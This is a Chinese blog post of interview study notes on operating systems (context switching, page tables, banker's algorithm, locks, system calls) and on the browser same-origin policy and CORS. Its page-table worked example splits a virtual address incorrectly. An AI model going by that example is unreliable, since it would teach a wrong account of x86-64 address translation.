class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求职之路-学习</title>
      <link href="/2024/07/09/qiu-zhi-zhi-lu-xue-xi/"/>
      <url>/2024/07/09/qiu-zhi-zhi-lu-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="求职之路-—-学习总结"><a href="#求职之路-—-学习总结" class="headerlink" title="求职之路 — 学习总结"></a>求职之路 — 学习总结</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="1-在进程切换的时候会发生什么？"><a href="#1-在进程切换的时候会发生什么？" class="headerlink" title="1. 在进程切换的时候会发生什么？"></a>1. 在进程切换的时候会发生什么？</h3><p>在操作系统中，进程切换（也称为上下文切换）是指将 CPU 从一个进程切换到另一个进程的过程。这个过程由操作系统内核负责管理，并确保系统资源能够在多个进程之间公平和有效地分配。以下是进程切换过程中发生的一些关键步骤：</p><p><strong>进程切换的主要步骤</strong></p><ol><li>保存当前进程的状态：</li></ol><ul><li>CPU寄存器：当前进程的所有CPU寄存器（如程序计数器、堆栈指针、通用寄存器等）被保存到进程的控制块（Process Control Block，PCB）中。</li><li>内存管理信息：当前进程的内存管理信息（如页表或段表）也被保存。</li></ul><ol start="2"><li>更新进程状态：</li></ol><ul><li>当前进程的状态在其PCB中被标记为“等待”或“就绪”状态，以反映它不再占用CPU。</li></ul><ol start="3"><li>选择下一个进程：</li></ol><ul><li>操作系统的调度器选择下一个要运行的进程。选择算法可能是基于优先级、时间片轮转、最短剩余时间优先等调度策略。</li></ul><ol start="4"><li>恢复下一个进程的状态：</li></ol><ul><li>CPU寄存器：从下一个进程的PCB中恢复所有的CPU寄存器。</li><li>内存管理信息：加载下一个进程的内存管理信息，以确保CPU能够正确访问进程的内存。</li></ul><ol start="5"><li>更新内存映射：</li></ol><ul><li>如果使用虚拟内存，操作系统可能需要更新内存映射（如页表）以确保CPU访问的是当前进程的内存。</li></ul><ol start="6"><li>更新进程状态：</li></ol><ul><li>被选中的进程状态在其PCB中被标记为“运行”状态，表示它正在占用CPU。</li></ul><ol start="7"><li>切换上下文：<br>最后一步，CPU的上下文被切换到新的进程，这包括跳转到新的程序计数器地址，并开始执行该进程的代码。</li></ol><p>示例：进程切换的汇编代码<br>以下是一个简化的进程切换示例，以x86-64汇编代码展示了保存和恢复寄存器的基本步骤：</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">复制代码; 保存当前进程的上下文save_context:    ; 保存通用寄存器    push rax    push rbx    push rcx    push rdx    push rsi    push rdi    push rbp    push r8    push r9    push r10    push r11    push r12    push r13    push r14    push r15    ; 保存指令指针和标志寄存器    pushfq    mov [current_process_rsp], rsp  ; 保存当前进程的堆栈指针    ; 切换到下一个进程    mov rsp, [next_process_rsp]     ; 恢复下一个进程的堆栈指针; 恢复下一个进程的上下文restore_context:    popfq    pop r15    pop r14    pop r13    pop r12    pop r11    pop r10    pop r9    pop r8    pop rbp    pop rdi    pop rsi    pop rdx    pop rcx    pop rbx    pop rax    ret  ; 返回并继续执行下一个进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>操作系统级别的进程切换</strong></p><p>在实际操作系统中，进程切换涉及更多的复杂性，包括但不限于：</p><ul><li>中断处理：中断（如时钟中断）通常是触发进程切换的事件。</li><li>内存保护和隔离：确保一个进程不能访问或修改另一个进程的内存。</li><li>多处理器支持：在多核系统中，可能需要处理多处理器间的同步和上下文切换。</li></ul><p><strong>总结</strong><br>进程切换是操作系统中的一个关键机制，它允许多个进程共享CPU资源。通过保存当前进程的状态并恢复下一个进程的状态，操作系统确保了进程的正确执行。虽然在底层实现上涉及复杂的硬件和软件交互，但其基本概念是保存和恢复进程的CPU状态及其内存管理信息。</p><ol><li>虚拟内存：<br>现代操作系统使用虚拟内存技术，为每个进程提供一个独立的虚拟地址空间。<br>虚拟地址空间通常包括代码段、数据段、堆段和堆栈段等。</li><li>页表：<br>每个进程都有自己的页表，用于映射虚拟地址到物理地址。<br>页表确保进程只能访问自己的虚拟地址空间，堆栈段也被映射到独立的物理内存区域。</li><li>内存管理单元 (MMU)：<br>MMU 负责将虚拟地址转换为物理地址，并根据页表设置进行访问权限检查。<br>操作系统内核设置每个进程的页表，并通过 MMU 确保进程间的内存隔离。</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">+----------------------+        +----------------------+| 进程 A 的虚拟内存空间 |        | 进程 B 的虚拟内存空间 |+----------------------+        +----------------------+|                      |        |                      ||   代码段 (text)      |        |   代码段 (text)      ||                      |        |                      |+----------------------+        +----------------------+|                      |        |                      ||   数据段 (data)      |        |   数据段 (data)      ||                      |        |                      |+----------------------+        +----------------------+|                      |        |                      ||   堆段 (heap)        |        |   堆段 (heap)        ||                      |        |                      |+----------------------+        +----------------------+|                      |        |                      ||   堆栈段 (stack)     |        |   堆栈段 (stack)     ||                      |        |                      |+----------------------+        +----------------------+|   内核空间           |        |   内核空间           |+----------------------+        +----------------------+进程 A 的页表                 进程 B 的页表+----------------------+        +----------------------+| 代码段映射           |        | 代码段映射           |+----------------------+        +----------------------+| 数据段映射           |        | 数据段映射           |+----------------------+        +----------------------+| 堆段映射             |        | 堆段映射             |+----------------------+        +----------------------+| 堆栈段映射           |        | 堆栈段映射           |+----------------------+        +----------------------+| 内核空间映射         |        | 内核空间映射         |+----------------------+        +----------------------+进程 A 的上下文                       进程 B 的上下文+----------------------+            +----------------------+| 寄存器值             |            | 寄存器值             ||   RSP -> 堆栈指针     |            |   RSP -> 堆栈指针     ||   RIP -> 指令指针     |            |   RIP -> 指令指针     |+----------------------+            +----------------------+| 页表基地址           |            | 页表基地址           |+----------------------+            +----------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-页表"><a href="#2-页表" class="headerlink" title="2. 页表"></a>2. 页表</h3><p>页表是存储在内存中的。页表是虚拟内存管理的一个关键组件，用于将虚拟地址映射到物理地址。操作系统和硬件协同工作，通过内存管理单元（MMU）使用页表来执行地址转换和内存保护。</p><p><strong>页表的结构</strong><br>页表通常是多级结构，以减少内存消耗并提高查找效率。以下是典型的 x86-64 架构的四级页表结构：</p><ol><li>页全局目录 (PGD)：</li></ol><ul><li>最上级页表，包含指向页上级目录的指针。</li></ul><ol start="2"><li>页上级目录 (PUD)：</li></ol><ul><li>第二级页表，包含指向页中间目录的指针。</li></ul><ol start="3"><li>页中间目录 (PMD)：</li></ol><ul><li>第三级页表，包含指向页表的指针。</li></ul><ol start="4"><li>页表 (PT)：</li></ol><ul><li>最低级页表，包含指向实际物理页的指针。</li></ul><p>每一级页表都包含页表项（PTE），每个页表项都指向下一级页表或实际物理内存页。</p><p><strong>页表的存储和访问</strong><br>页表本身存储在内存中。当进程运行时，CPU 使用内存管理单元（MMU）和控制寄存器来访问页表并进行地址转换。</p><p><strong>CPU 寄存器</strong></p><ul><li>CR3 寄存器：在 x86-64 架构中，CR3 寄存器包含当前活动页表（通常是页全局目录）的物理地址。当进行上下文切换时，操作系统会更新 CR3 寄存器以指向新进程的页表。</li></ul><p><strong>地址转换过程</strong></p><ol><li>虚拟地址分解：虚拟地址分为多个部分，每个部分对应于页表结构中的不同级别。</li><li>查找页表项：MMU 使用虚拟地址的各个部分逐级查找页表项，从 PGD 开始，直到找到最终的物理页地址。</li><li>访问物理内存：根据最终找到的物理页地址，访问实际的物理内存。</li></ol><p><strong>示例：四级页表地址转换</strong></p><p>假设虚拟地址为 0x123456789ABC：</p><ol><li>虚拟地址分解：</li></ol><ul><li>PGD 索引：0x1</li><li>PUD 索引：0x2</li><li>PMD 索引：0x3</li><li>PT 索引：0x4</li><li>页内偏移：0x56789ABC</li></ul><ol start="2"><li>地址转换：</li></ol><ul><li>从 CR3 寄存器中获取 PGD 基地址。</li><li>使用 PGD 索引查找 PUD 的基地址。</li><li>使用 PUD 索引查找 PMD 的基地址。</li><li>使用 PMD 索引查找 PT 的基地址。</li><li>使用 PT 索引查找物理页的基地址。</li><li>加上页内偏移，得到最终的物理地址。</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">+-----------------------+|      CR3 寄存器       || (PGD 基地址)          |+-----------+-----------+            |            v+-----------------------+      +-----------------------+| 页全局目录 (PGD)      |      | 页表项 (PTE)          || +------+ +----------+ |      | +------+ +----------+ || | 索引 | | PUD 基地址| |      | | 索引 | | 物理页地址 | || +------+ +----------+ |      | +------+ +----------+ |+-----------------------+      +-----------------------+            |            v+-----------------------+| 页上级目录 (PUD)      || +------+ +----------+ || | 索引 | | PMD 基地址| || +------+ +----------+ |+-----------------------+            |            v+-----------------------+| 页中间目录 (PMD)      || +------+ +----------+ || | 索引 | | PT 基地址 | || +------+ +----------+ |+-----------------------+            |            v+-----------------------+| 页表 (PT)             || +------+ +----------+ || | 索引 | | 物理页地址 | || +------+ +----------+ |+-----------------------+            |            v+-----------------------+| 物理页                || +-------------------+ || | 页内偏移           | || +-------------------+ |+-----------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-虚拟内存和物理内存的关系"><a href="#3-虚拟内存和物理内存的关系" class="headerlink" title="3. 虚拟内存和物理内存的关系"></a>3. 虚拟内存和物理内存的关系</h3><p>程序的堆栈段、代码段、数据段等最终都映射到物理内存上。虚拟内存管理通过页表将进程的虚拟地址空间映射到实际的物理内存地址，从而实现进程对内存的访问。</p><p>虚拟内存是操作系统提供的一种抽象，使每个进程看起来拥有独立的、连续的内存地址空间。实际上，这些虚拟地址通过页表映射到物理内存中的不同位置。</p><p><strong>虚拟内存的分段</strong><br>典型的进程虚拟地址空间包括以下几个主要段：</p><ol><li>代码段 (text segment)：</li></ol><ul><li>存储程序的可执行代码。</li><li>映射到物理内存中的只读区域，通常由操作系统和加载器负责加载。</li></ul><ol start="2"><li>数据段 (data segment)：</li></ol><ul><li>存储全局变量和静态变量。</li><li>包括已初始化数据段和未初始化数据段（BSS）。</li></ul><ol start="3"><li>堆段 (heap segment)：</li></ol><ul><li>用于动态内存分配，例如通过 malloc 等函数。</li><li>堆段的大小可以在程序运行时动态增长。</li></ul><ol start="4"><li>堆栈段 (stack segment)：</li></ol><ul><li>用于函数调用和局部变量。</li><li>堆栈从高地址向低地址增长。</li></ul><p>每个进程有自己的页表，操作系统通过页表管理虚拟地址到物理地址的映射</p><p>页表 (Page Table)：</p><ul><li>页表是存储在物理内存中的数据结构，每个进程有自己独立的页表。</li><li>页表条目（PTE）包含虚拟页面和物理页面的映射信息，包括页的物理地址和访问权限。</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">进程的虚拟地址空间                    物理内存+----------------------+            +----------------------+| 高地址               |            |                      || ...                  |            |                      || 堆栈段 (stack)       |            |   物理页             || ...                  |            |   ...                ||                      |            |   ...                || 堆段 (heap)          |            |                      || ...                  |            |   物理页             ||                      |            |                      || 数据段 (data)        |            |   物理页             ||                      |            |                      || 代码段 (text)        |            |   物理页             ||                      |            |                      || 低地址               |            |                      |+----------------------+            +----------------------+虚拟地址空间                         页表                          物理内存+-------------------+              +-------------+                +-----------------+|                   |              | 页表项 (PTE) |                | 物理页框 (PF)   || 代码段 (text)     |              | +---------+ |                | +-------------+ || +0x0000           | --+--------> | | 物理地址 | |  +------->    | | 代码段       | ||                   |   |          | +---------+ |  |             | +-------------+ |+-------------------+   |          +-------------+  |             +-----------------+|                   |   |                            || 数据段 (data)     |   |          +-------------+  |             +-----------------+| +0x1000           | --+--------> | 页表项 (PTE) |  +------->    | 物理页框 (PF)   ||                   |              | +---------+ |                | +-------------+ |+-------------------+              | | 物理地址 | |                | | 数据段       | ||                   |              | +---------+ |                | +-------------+ || 堆段 (heap)       |              +-------------+                +-----------------+| +0x2000           |                                       ||                   |                                       |      +-----------------++-------------------+              +-------------+          |      | 物理页框 (PF)   ||                   |              | 页表项 (PTE) |          |      | +-------------+ || 堆栈段 (stack)    | --+--------> | +---------+ |  +------>+------>| | 堆栈段       | || +0x3000           |   |          | | 物理地址 | |                | +-------------+ ||                   |   |          | +---------+ |                +-----------------+|                   |   |          +-------------++-------------------+   |                        |+-------------------+   || 页表基地址       |    || +-------------+ |    || | CR3         | | --+| +-------------+ |+-------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-银行家调度算法"><a href="#4-银行家调度算法" class="headerlink" title="4. 银行家调度算法"></a>4. 银行家调度算法</h3><p>(<a href="https://www.cnblogs.com/wkfvawl/p/11929508.html)[https://www.cnblogs.com/wkfvawl/p/11929508.html]">https://www.cnblogs.com/wkfvawl/p/11929508.html)[https://www.cnblogs.com/wkfvawl/p/11929508.html]</a></p><p>（1）系统在某一时刻的安全状态可能不唯一，但这不影响对系统安全性的判断。<br>（2）安全状态是非死锁状态，而不安全状态并不一定是死锁状态。即系统处于安全状态一定可以避免死锁，而系统处于不安全状态则仅仅可能进入死锁状态。</p><p>做题的时候，列好3个矩阵。<code>max矩阵</code>即进程最大需要的资源矩阵，<code>allocation矩阵</code>即已经分配给进程的资源矩阵，<code>need矩阵</code>进程目前还需要的资源矩阵。<code>available</code>即目前还拥有的资源数量。然后就是假设分配给某个进程资源后，是否存在一个安全序列。如果存在，则系统安全。不存在，则系统 <code>可能死锁</code>。</p><h3 id="5-乐观锁和悲观锁"><a href="#5-乐观锁和悲观锁" class="headerlink" title="5. 乐观锁和悲观锁"></a>5. 乐观锁和悲观锁</h3><p>乐观锁和悲观锁是两种常见的并发控制机制，用于解决多线程或多进程环境下的资源竞争问题。它们在处理并发事务时的理念和实现方式有所不同。</p><ol><li>悲观锁（Pessimistic Lock）<br>悲观锁 的核心思想是对资源的并发访问持悲观态度，假设每次数据访问都会发生冲突，因此在操作数据前，必须先加锁，以防止其他事务对该数据进行修改。</li></ol><p>特点：</p><ul><li>锁定资源: 在读取或修改数据之前，对数据加锁，确保其他事务在当前事务完成之前无法访问或修改该数据。</li><li>实现方式: 通常通过数据库的行锁、表锁或分布式锁来实现。对于数据库操作，悲观锁的典型实现是 SELECT FOR UPDATE，这会在查询数据的同时对查询的行加上排他锁。</li><li>适用场景: 适用于数据争用非常激烈的场景，如同一份数据被多个事务频繁修改，锁可以避免脏读、不可重复读、幻读等问题。</li></ul><p>缺点：</p><ul><li>性能影响: 因为每次操作都要加锁和释放锁，可能会导致较高的性能开销，尤其是在锁定范围大、锁定时间长的情况下。<br>可能产生死锁: 如果多个事务之间的锁定顺序不当，可能会发生死锁。</li></ul><ol start="2"><li>乐观锁（Optimistic Lock）<br>乐观锁 的核心思想是对资源的并发访问持乐观态度，假设大部分情况下不会发生冲突，因此在修改数据时不加锁，但在提交修改时会进行冲突检测。</li></ol><p>特点：</p><ul><li>无锁操作: 在读取数据时不加锁，允许其他事务并发修改数据，只有在提交时才进行冲突检测。</li><li>实现方式: 通常通过版本号（Version）或时间戳来实现。每次读取数据时获取当前版本号或时间戳，更新时再比较。如果提交时版本号或时间戳未发生变化，说明没有其他事务修改过数据，可以提交修改；否则，操作会失败，需要重新读取数据并尝试更新。</li><li>适用场景: 适用于数据争用不严重的场景，如大多数事务对同一份数据的修改概率较低的情况下，乐观锁的性能较高。</li></ul><p>缺点：</p><ul><li>处理冲突的成本: 如果事务冲突频繁，乐观锁可能导致大量重试操作，影响系统性能。</li><li>需要业务支持: 乐观锁通常需要业务逻辑配合，如设计表结构时引入版本号字段。</li></ul><p>总结对比</p><ul><li>锁定策略:<ul><li>悲观锁：假定会发生冲突，主动加锁防止其他事务修改数据。</li><li>乐观锁：假定不会发生冲突，不加锁，但在提交时检测冲突。</li></ul></li><li>适用场景:<ul><li>悲观锁：适用于并发写入频繁、数据冲突概率高的场景。</li><li>乐观锁：适用于并发写入较少、冲突概率低的场景。</li></ul></li><li>性能影响:<ul><li>悲观锁：可能带来较高的性能开销，尤其在高并发环境中。</li><li>乐观锁：在冲突较少的情况下性能更优，但在冲突频繁时重试会带来额外开销。</li></ul></li></ul><h3 id="6-系统调用与一般调用之间的区别"><a href="#6-系统调用与一般调用之间的区别" class="headerlink" title="6. 系统调用与一般调用之间的区别"></a>6. 系统调用与一般调用之间的区别</h3><p>系统调用（system call）与一般函数调用（function call）在计算机系统中有着不同的作用和执行方式。以下是它们的主要区别：</p><h4 id="1-定义与作用"><a href="#1-定义与作用" class="headerlink" title="1. 定义与作用"></a>1. <strong>定义与作用</strong></h4><ul><li><strong>系统调用</strong>：<ul><li><strong>定义</strong>：系统调用是操作系统提供的接口，通过它，用户程序可以请求操作系统执行特定的服务，例如文件操作、进程管理、内存分配、网络通信等。</li><li><strong>作用</strong>：系统调用使得用户空间的程序可以访问和使用操作系统内核提供的资源和服务，例如读取文件、发送网络请求、分配内存等。</li></ul></li><li><strong>一般调用</strong>：<ul><li><strong>定义</strong>：一般函数调用是在程序内部或库中调用函数，不涉及操作系统内核，只在用户空间中执行。</li><li><strong>作用</strong>：一般函数调用主要用于程序内部的逻辑处理和功能实现，比如数学计算、字符串操作、数据处理等。</li></ul></li></ul><h4 id="2-执行环境"><a href="#2-执行环境" class="headerlink" title="2. 执行环境"></a>2. <strong>执行环境</strong></h4><ul><li><strong>系统调用</strong>：<ul><li><strong>执行环境</strong>：系统调用需要从用户空间切换到内核空间执行。用户程序通过系统调用将请求传递给操作系统内核，操作系统内核在内核态下执行这些操作。</li><li><strong>权限级别</strong>：系统调用执行在更高权限的内核态（Ring 0）下，因为它需要访问硬件资源和操作系统核心功能。</li></ul></li><li><strong>一般调用</strong>：<ul><li><strong>执行环境</strong>：一般函数调用在用户空间执行，不涉及操作系统内核，不需要进行用户态到内核态的切换。</li><li><strong>权限级别</strong>：一般函数调用在用户态（Ring 3）下执行，只能访问用户空间的资源。</li></ul></li></ul><h4 id="3-开销"><a href="#3-开销" class="headerlink" title="3. 开销"></a>3. <strong>开销</strong></h4><ul><li><strong>系统调用</strong>：<ul><li><strong>开销</strong>：由于系统调用涉及从用户态到内核态的切换，这种上下文切换需要一定的时间和资源，因此系统调用的开销较大。</li><li><strong>原因</strong>：切换过程需要保存当前用户态的状态，进入内核态后执行操作，再切换回用户态，恢复状态。这一过程增加了执行时间。</li></ul></li><li><strong>一般调用</strong>：<ul><li><strong>开销</strong>：一般函数调用在同一执行上下文中进行，不涉及上下文切换，开销较小。</li><li><strong>原因</strong>：函数调用只需要在当前栈上保存状态（如函数参数、返回地址），然后跳转到函数的执行代码，执行完毕后返回即可。</li></ul></li></ul><h4 id="4-使用场景"><a href="#4-使用场景" class="headerlink" title="4. 使用场景"></a>4. <strong>使用场景</strong></h4><ul><li><strong>系统调用</strong>：<ul><li><strong>使用场景</strong>：系统调用用于需要操作系统服务或资源的场景，如文件读写、进程创建与管理、网络通信等。</li><li><strong>示例</strong>：<code>read()</code>, <code>write()</code>, <code>fork()</code>, <code>execve()</code>, <code>open()</code>, <code>close()</code> 等。</li></ul></li><li><strong>一般调用</strong>：<ul><li><strong>使用场景</strong>：一般函数调用用于普通的程序逻辑处理，不涉及系统级资源管理。</li><li><strong>示例</strong>：<code>strlen()</code>, <code>printf()</code>, <code>sort()</code>, <code>math.sqrt()</code> 等。</li></ul></li></ul><h4 id="5-错误处理"><a href="#5-错误处理" class="headerlink" title="5. 错误处理"></a>5. <strong>错误处理</strong></h4><ul><li><strong>系统调用</strong>：<ul><li><strong>错误处理</strong>：系统调用由于涉及硬件资源和操作系统服务，可能出现各种系统级错误，通常通过返回负值或设置 <code>errno</code> 来表示错误，需要特殊处理。</li></ul></li><li><strong>一般调用</strong>：<ul><li><strong>错误处理</strong>：一般函数调用的错误通常是程序逻辑错误或输入错误，处理方式多样，视具体情况而定。</li></ul></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><strong>系统调用</strong> 是用户程序与操作系统之间的接口，用于请求操作系统服务，涉及用户态到内核态的切换，开销较大，但允许访问和操作系统资源。</li><li><strong>一般函数调用</strong> 仅在用户空间执行，用于程序内部的逻辑处理和功能实现，开销较小，不涉及操作系统内核。</li></ul><p>理解系统调用和一般函数调用的区别，有助于开发者更好地优化程序性能，并正确选择和使用操作系统提供的服务。</p><p>系统调用可以嵌套，但需要理解嵌套调用的具体含义和实际情况。</p><h4 id="1-嵌套系统调用的概念"><a href="#1-嵌套系统调用的概念" class="headerlink" title="1. 嵌套系统调用的概念"></a>1. <strong>嵌套系统调用的概念</strong></h4><p><strong>嵌套系统调用</strong>指的是在一个系统调用的执行过程中，另一个系统调用被调用。例如，系统调用 A 在执行过程中，又触发了系统调用 B。</p><h4 id="2-实际情况"><a href="#2-实际情况" class="headerlink" title="2. 实际情况"></a>2. <strong>实际情况</strong></h4><ul><li><strong>内核态的嵌套</strong>：<ul><li>在某些复杂的操作中，操作系统内核本身可能在执行一个系统调用时，需要调用其他内核功能，这可能会触发其他系统调用。虽然从用户程序的角度看，这些调用是独立的，但内核可能会嵌套地执行它们。例如，在文件系统的实现中，打开文件（<code>open()</code>）的系统调用可能会在内核态触发其他与文件系统相关的系统调用。</li></ul></li><li><strong>用户态到内核态的嵌套</strong>：<ul><li>在典型的操作系统设计中，用户态程序可以多次调用系统调用，而这些调用可能看起来是嵌套的。但从内核的角度看，每次调用都是一个独立的上下文切换，即从用户态切换到内核态，完成调用后再返回用户态。因此，虽然用户程序中可能出现看似嵌套的系统调用，但它们在内核中通常是依次处理的。</li></ul></li></ul><h4 id="3-嵌套调用的处理方式"><a href="#3-嵌套调用的处理方式" class="headerlink" title="3. 嵌套调用的处理方式"></a>3. <strong>嵌套调用的处理方式</strong></h4><ul><li><strong>上下文切换</strong>：每次系统调用都会导致从用户态到内核态的上下文切换，即使是在一个系统调用内部调用另一个系统调用，这个过程也需要重新保存和恢复上下文。操作系统内核是设计来处理这样的场景的。</li><li><strong>重入与线程安全</strong>：大多数现代操作系统内核是重入的，这意味着多个系统调用可以同时在不同的上下文（例如不同的线程或进程）中执行，即使它们是嵌套调用。内核通过锁、原子操作等机制来确保这些调用的线程安全。</li></ul><h4 id="4-示例"><a href="#4-示例" class="headerlink" title="4. 示例"></a>4. <strong>示例</strong></h4><ul><li><strong>实际示例</strong>：假设你在用户程序中执行 <code>write()</code> 系统调用，这个调用会在内核中进行文件写操作。如果这个文件是网络文件系统上的一个文件，那么在 <code>write()</code> 的过程中，内核可能会进行网络数据传输，这可能需要调用另一个与网络栈相关的系统调用。</li></ul><h3 id="7-为什么页号最多占一页的容量"><a href="#7-为什么页号最多占一页的容量" class="headerlink" title="7. 为什么页号最多占一页的容量"></a>7. 为什么页号最多占一页的容量</h3><p>如果页表的大小超过了一页的容量，则无法通过一个页表索引直接访问完整的页表，这会导致分页机制失去简洁性和有效性。在这种情况下，内存管理变得复杂，页表需要额外的管理机制来处理其超过一页容量的部分，这样会降低分页系统的效率。</p><p>因此，页号对应的页表最多只能占一页的容量，这是为了确保分页系统的页表能够被有效地管理和分配。如果页表超过一页的容量，可能需要更复杂的多级页表或其他机制来处理，这违背了分页简化内存管理的初衷。</p><h3 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h3><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="1-跨域的问题是出于浏览器的同源策略限制"><a href="#1-跨域的问题是出于浏览器的同源策略限制" class="headerlink" title="1. 跨域的问题是出于浏览器的同源策略限制"></a>1. 跨域的问题是出于浏览器的同源策略限制</h3><p>跨域问题主要是由于<strong>浏览器的同源策略（Same-Origin Policy, SOP）</strong>导致的。同源策略是一种重要的安全机制，用来防止恶意网站通过脚本对另一个网站的数据进行未经授权的访问。</p><p><strong>什么是同源策略？</strong><br>同源策略规定，只有当两个 URL 具有相同的协议、域名和端口号时，它们才被认为是同源的。具体来说，同源策略的三要素是：</p><ul><li>协议：如 HTTP、HTTPS。</li><li>域名：如 example.com。</li><li>端口号：如 80（HTTP 默认端口）或 443（HTTPS 默认端口）。<br>如果两个 URL 的协议、域名和端口号都相同，它们就是同源的，否则就是跨域的。</li></ul><p><strong>跨域问题的表现</strong><br>当 Web 应用程序尝试从一个不同源的服务器请求资源时，浏览器会阻止这些请求，表现为跨域问题。例如，来自 <a href="https://example.com/">https://example.com</a> 的网页试图通过 JavaScript 发起一个到 <a href="https://api.anotherdomain.com/">https://api.anotherdomain.com</a> 的请求，就会因为同源策略而被阻止。</p><p><strong>常见的跨域操作包括：</strong></p><ul><li>AJAX 请求：使用 XMLHttpRequest 或 fetch API 向不同源的服务器发起请求。</li><li>嵌入第三方资源：如在页面中嵌入来自不同源的 <code>&lt;iframe&gt;</code>、图片、脚本等。</li><li>访问第三方的 cookies、localStorage 等。</li></ul><p><strong>解决跨域问题的方法</strong><br>由于跨域问题是由同源策略引起的，因此解决跨域问题的核心是让浏览器信任不同源的请求。常见的解决方案包括：</p><ul><li>CORS（Cross-Origin Resource Sharing）：<br>CORS 是一种机制，允许服务器通过设置特定的 HTTP 头，来告诉浏览器允许来自其他源的请求。常见的 CORS 头包括：<ul><li>Access-Control-Allow-Origin: 指定允许访问资源的域名，可以是 * 表示允许所有域名访问。</li><li>Access-Control-Allow-Methods: 指定允许的 HTTP 方法，如 GET、POST 等。</li><li>Access-Control-Allow-Headers: 指定允许的 HTTP 请求头。</li></ul></li><li>JSONP（JSON with Padding）：<br>JSONP 是一种跨域请求的早期解决方案，通常用于 GET 请求。它通过动态创建一个 <code>&lt;script&gt; </code>标签，并将请求参数放在 URL 中。由于 <code> &lt;script&gt;</code> 标签不受同源策略的限制，因此可以绕过跨域问题。不过，JSONP 仅支持 GET 请求，且存在安全性问题，因此不推荐用于现代应用。</li><li>代理服务器：<br>可以通过在同源服务器上设置代理，将跨域请求转发到目标服务器。客户端向同源服务器发送请求，服务器再代为请求目标资源。这种方式能够很好地绕过浏览器的同源策略，但需要额外配置服务器。</li><li>服务器端渲染：<br>对于某些请求，可以在服务器端完成所有数据请求，并将结果直接渲染给客户端，从而避免浏览器端的跨域问题。</li></ul><p><strong>总结</strong><br>跨域问题源于浏览器的同源策略，旨在保护用户免受跨站点脚本攻击。通过使用 CORS、JSONP、代理服务器等技术，可以解决跨域问题，允许安全的跨域数据访问。</p><p><strong>只要不通过浏览器访问，就不会触发同源策略？</strong></p><p>同源策略（Same-Origin Policy, SOP） 是一种专门针对浏览器的安全机制。因此，只有在通过浏览器进行访问时，同源策略才会生效，限制跨源请求。如果不通过浏览器访问，比如服务器端脚本、命令行工具、移动应用、后端服务之间的通信等，则不受同源策略的限制。</p><p><strong>具体来说：</strong></p><ol><li>浏览器访问：</li></ol><ul><li>当你在浏览器中访问网页，并且该网页中的脚本尝试从不同源获取资源时，浏览器的同源策略会生效，限制这些跨域请求。</li><li>例如，使用 JavaScript 发起 AJAX 请求、嵌入跨域的 <code>&lt;iframe&gt;</code>、通过 JavaScript 访问 cookies 等，都会受到同源策略的限制。<br>非浏览器环境：</li></ul><ol start="2"><li>服务器端代码：如在服务器端的 Python、Node.js、Java、PHP 等编程语言中发起的 HTTP 请求，不受同源策略的限制。服务器可以自由地与任何源通信，无需考虑同源策略。</li></ol><ul><li>命令行工具：如 curl、wget 等工具可以用来发起 HTTP 请求，不受同源策略限制。</li><li>移动应用：移动应用在请求 API 或资源时，也不受同源策略的限制，应用开发者可以自由地与不同源的服务器进行通信。</li></ul><p><strong>举个例子：</strong></p><ul><li>浏览器环境：你在 <a href="https://example.com/">https://example.com</a> 上运行的 JavaScript 代码尝试向 <a href="https://api.anotherdomain.com/">https://api.anotherdomain.com</a> 发起 AJAX 请求。由于不同源，浏览器的同源策略会阻止这个请求，除非目标服务器通过 CORS 头允许该请求。</li><li>服务器环境：假设你在服务器端（如 Node.js）写了一段代码，通过 https.request 向 <a href="https://api.anotherdomain.com/">https://api.anotherdomain.com</a> 